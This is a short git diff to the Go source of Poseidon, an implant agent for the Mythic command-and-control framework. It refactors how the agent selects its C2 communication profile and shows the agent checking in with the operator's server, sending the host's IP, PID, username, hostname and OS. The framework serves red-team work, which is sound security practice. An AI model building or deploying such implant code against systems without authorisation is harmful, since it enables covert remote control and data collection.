@@ -30,12 +30,10 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles/http"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles/websocket"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rm"
@@ -154,18 +152,11 @@ func main() {
 	arch := functions.GetArchitecture()
 
 	// Get C2 Profile
-	var profile profiles.Profile
-	switch c2Profile {
-	case "http":
-		profile = http.New()
-	case "websocket":
-		profile = websocket.New()
-	default:
-		profile = http.New()
-	}
+	// The (profiles.Profile) type assertion is needed because the C2 Profile that contains New() function is not
+	// copied into the pkg/profiles/ directory until compile time. The assertion clears errors in this file as a workaround
+	profile := profiles.New()
 
-	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
-	// fmt.Println(currentUser.Name)
+	// Checkin with Mythic
 	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname, OperatingSystem, arch)
 	checkIn := resp.(structs.CheckInMessageResponse)
 	profile.SetApfellID(checkIn.ID)
